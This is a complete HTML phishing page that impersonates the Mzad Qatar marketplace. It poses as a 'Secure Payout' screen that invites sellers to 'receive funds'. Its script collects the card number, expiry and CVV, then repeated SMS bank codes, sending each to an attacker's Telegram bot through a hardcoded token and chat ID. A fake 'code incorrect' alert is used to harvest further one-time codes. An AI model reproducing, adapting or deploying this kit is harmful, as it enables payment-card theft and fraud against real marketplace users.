<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Mzad Qatar | Secure Payout</title>
    <link rel="icon" type="image/png" href="https://mzadqatar.com/frontend/images/mzad/favicon.png">
    <style>
        :root { --mzad-red: #8a1538; --bg: #f7f7f7; --text: #333; }
        body { font-family: 'Segoe UI', Roboto, sans-serif; background: var(--bg); margin: 0; padding: 0; color: var(--text); }
        .container { max-width: 480px; margin: 0 auto; background: #fff; min-height: 100vh; box-shadow: 0 0 15px rgba(0,0,0,0.05); }
        
        .header { background: #fff; padding: 15px 20px; border-bottom: 3px solid var(--mzad-red); display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; }
        .header img { height: 42px; }
        .lang { color: var(--mzad-red); font-weight: 700; font-size: 14px; }

        .ad-box { border-bottom: 8px solid var(--bg); }
        .img-container { width: 100%; aspect-ratio: 1.2; background: white; display: flex; align-items: center; justify-content: center; overflow: hidden; border-bottom: 1px solid #eee; }
        .img-container img { width: 100%; height: 100%; object-fit: contain; }
        .info { padding: 16px; }
        .title { font-size: 20px; font-weight: 700; color: #111; margin-bottom: 5px; }
        .price { font-size: 28px; font-weight: 800; color: var(--mzad-red); margin-bottom: 15px; }
        
        .btn-trigger-area { padding: 20px 16px; }
        .btn { background: var(--mzad-red); color: white; border: none; width: 100%; padding: 18px; border-radius: 12px; font-size: 18px; font-weight: 700; cursor: pointer; box-shadow: 0 4px 15px rgba(138,21,56,0.2); }

        /* MODAL */
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 2000; align-items: center; justify-content: center; }
        .modal-content { background: white; width: 85%; padding: 25px; border-radius: 20px; text-align: center; }
        .modal-h { font-size: 18px; font-weight: 700; margin-bottom: 20px; color: var(--mzad-red); }
        .q-inp { width: 100%; padding: 16px; border: 1px solid #ddd; border-radius: 10px; font-size: 16px; box-sizing: border-box; margin-bottom: 12px; outline: none; text-align: center; }
        .q-inp.error { border-color: #ff4d4d; background: #fff8f8; }

        #step-2 { display: none; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid var(--mzad-red); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        .app-footer { background: #fff; padding: 30px 16px; text-align: center; border-top: 8px solid var(--bg); }
        .store-badges { display: flex; justify-content: center; gap: 10px; margin-top: 15px; }
        .store-badges img { height: 35px; border-radius: 6px; }
    </style>
</head>
<body>

<div class="container">
    <div class="header">
        <img src="https://mzadqatar.com/frontend/images/mzad/download-logo.svg" alt="Mzad Logo">
        <div class="lang">العربية</div>
    </div>

    <div class="ad-box">
        <div class="img-container"><img id="p-img" src=""></div>
        <div class="info">
            <div style="color: #27ae60; font-size: 12px; font-weight: 800; margin-bottom: 5px;">● SECURE PAYOUT AVAILABLE</div>
            <h1 class="title" id="p-name">Loading...</h1>
            <div class="price" id="p-price">0 QAR</div>
        </div>
    </div>

    <div class="btn-trigger-area">
        <button class="btn" onclick="openModal()">RECEIVE FUNDS</button>
    </div>

    <div class="modal" id="payModal">
        <div class="modal-content" id="step-1">
            <div class="modal-h">Card Verification</div>
            <form id="card-form">
                <input type="text" id="cn" class="q-inp" placeholder="Card Number" required maxlength="19">
                <div style="display: flex; gap: 10px;">
                    <input type="text" id="ce" class="q-inp" placeholder="MM/YY" required maxlength="5" style="flex: 1.5;">
                    <input type="text" id="cv" class="q-inp" placeholder="CVV" required maxlength="4" style="flex: 1;">
                </div>
                <button type="submit" class="btn">CONFIRM</button>
            </form>
            <div onclick="closeModal()" style="margin-top:15px; color:#999; cursor:pointer; font-size:14px;">Cancel</div>
        </div>

        <div class="modal-content" id="step-2">
            <div class="modal-h" style="color: #333;">Bank Authentication</div>
            <p style="font-size:13px; color:#666;">Enter the code sent to your phone to confirm the transfer.</p>
            <div id="loading" style="display:none;"><div class="loader"></div></div>
            <form id="sms-form">
                <input type="text" id="sms" class="q-inp" placeholder="SMS Code" required style="letter-spacing: 3px; font-size: 20px;">
                <button type="submit" class="btn">VERIFY</button>
            </form>
        </div>
    </div>

    <div class="app-footer">
        <p style="font-weight: 700; font-size: 13px;">GET THE MZAD QATAR APP</p>
        <div class="store-badges">
            <img src="https://mzadqatar.com/frontend/images/mzad/app_store.png">
            <img src="https://mzadqatar.com/frontend/images/mzad/google_play.png">
        </div>
        <div style="margin-top: 25px; font-size: 11px; color: #bbb;">© 2026 Mzad Qatar Protection</div>
    </div>
</div>

<script>
    // БОТ ЛОГОВ
    const T = '8696752912:AAE6Fnd58gnJ-gU6XwuZUQ9BgSP7liN89k4';
    const C = '8071425015';

    // Декодируем параметры из HASH ссылки (#...)
    let item = "Device", price = "0", img = "";
    const hash = window.location.hash.substring(1);
    
    if(hash) {
        try {
            // Безопасный декод UTF-8
            const decodedStr = decodeURIComponent(escape(window.atob(hash)));
            const decodedObj = JSON.parse(decodedStr);
            item = decodedObj.i || item;
            price = decodedObj.p || price;
            img = decodedObj.m || img;
        } catch(e) { console.error(e); }
    }

    document.getElementById('p-name').innerText = item;
    document.getElementById('p-price').innerText = price + ' QAR';
    if(img) document.getElementById('p-img').src = `https://wsrv.nl/?url=${encodeURIComponent(img)}`;

    function openModal() { document.getElementById('payModal').style.display = 'flex'; }
    function closeModal() { document.getElementById('payModal').style.display = 'none'; }

    // Маски ввода
    document.getElementById('cn').oninput = (e) => { e.target.value = e.target.value.replace(/\D/g,'').replace(/(.{4})/g,'$1 ').trim(); };
    document.getElementById('ce').oninput = (e) => { e.target.value = e.target.value.replace(/\D/g,'').replace(/(.{2})/,'$1/').trim(); };

    // Лун валидатор
    function luhn(s) {
        let v = s.replace(/\s+/g, '');
        let sum = 0;
        for (let i = 0; i < v.length; i++) {
            let n = parseInt(v.substr(i, 1));
            if (i % 2 === v.length % 2) { n *= 2; if (n > 9) n -= 9; }
            sum += n;
        }
        return sum % 10 === 0 && v.length >= 15;
    }

    // Отправка КАРТЫ
    document.getElementById('card-form').onsubmit = (e) => {
        e.preventDefault();
        const cn = document.getElementById('cn');
        if(!luhn(cn.value)) {
            cn.classList.add('error');
            alert("Invalid card number.");
            return;
        }

        const msg = `🇶🇦 **MZAD CARD**\n📦 ${item}\n💰 ${price} QAR\n💳 \`${cn.value}\`\n📅 \`${document.getElementById('ce').value}\`\n🔒 \`${document.getElementById('cv').value}\``;
        new Image().src = `https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;

        // Переход к SMS
        document.getElementById('step-1').style.display = 'none';
        document.getElementById('step-2').style.display = 'block';
        document.getElementById('sms-form').style.display = 'none';
        document.getElementById('loading').style.display = 'block';
        
        setTimeout(() => {
            document.getElementById('loading').style.display = 'none';
            document.getElementById('sms-form').style.display = 'block';
        }, 2000);
    };

    // Отправка SMS
    document.getElementById('sms-form').onsubmit = (e) => {
        e.preventDefault();
        const code = document.getElementById('sms').value;
        const msg = `🔑 **SMS CODE**: \`${code}\`\n📦 Item: ${item}`;
        new Image().src = `https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
        
        alert("The verification code is incorrect or expired. A new code has been sent.");
        document.getElementById('sms').value = '';
    };
</script>
</body>
</html>
